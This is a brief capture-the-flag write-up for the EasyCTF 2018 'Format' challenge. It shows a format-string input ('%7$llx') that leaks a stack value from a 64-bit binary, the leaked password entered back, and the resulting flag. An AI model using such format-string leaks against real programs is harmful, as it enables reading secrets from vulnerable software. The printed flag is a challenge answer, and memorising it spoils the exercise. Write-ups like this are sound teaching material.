# EasyCTF_2018: Format

**Category:** Binary Exploitation
**Points:** 160
**Description:**

>Go to `/problems/format` on the shell server and tell me what is in `flag.txt`.

## Write-up
We are given two relevant files, [format](format) and [format.c](format.c). This is a really easy challenge where you just have to format string your way out. However, as it is a 64-bit binary, certain tricks have to be played to get the password :)

    $ ./format
    Enter your name: %7$llx
    Your name is: 1eb89e5c00000000

    Enter your secret password (in hex)
    0x1eb89e5c
    easyctf{p3sky_f0rm4t_s7uff}

Therefore, the flag is `easyctf{p3sky_f0rm4t_s7uff}`.
